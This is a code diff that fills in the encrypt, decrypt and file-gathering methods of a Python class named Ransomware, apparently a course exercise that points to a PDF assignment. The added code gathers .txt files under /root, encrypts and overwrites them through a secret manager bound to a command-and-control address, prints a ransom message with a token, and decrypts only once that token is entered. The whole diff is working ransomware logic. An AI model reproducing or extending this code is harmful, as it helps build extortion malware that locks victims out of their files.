@@ -36,15 +36,51 @@ class Ransomware:
 
     def get_files(self, filter:str)->list:
         # return all files matching the filter
-        raise NotImplemented()
+        return list(Path("/root").glob(filter))
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # get all the txt files
+        files = self.get_files("*.txt")
+        # create a secret manager
+        secret_manager = SecretManager(CNC_ADDRESS)
+        # call the setup
+        secret_manager.setup()
+        # encrypt the files
+        for file in files:
+            with open(file, "rb") as f:
+                data = f.read()
+            encrypted_data = secret_manager.encrypt(data)
+            with open(file, "wb") as f:
+                f.write(encrypted_data)
+        # print the message
+        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
+        
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # try exept to catch the exception if the token is not valid
+        try:
+            # ask the user for the token
+            token = input("Token: ")
+            # call set_key
+            secret_manager = SecretManager(CNC_ADDRESS)
+            secret_manager.set_key(token)
+            # call the xorfile function
+            files = self.get_files("*.txt")
+            for file in files:
+                secret_manager.xorfile(file)
+            #call the clean function
+            secret_manager.clean()
+            # print the message
+            print("Your files have been decrypted")
+            # leave the program
+            sys.exit(0)
+        except Exception as e:
+            # print the error message
+            print("Invalid token")
+            # go back to the main function
+            self.decrypt()
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
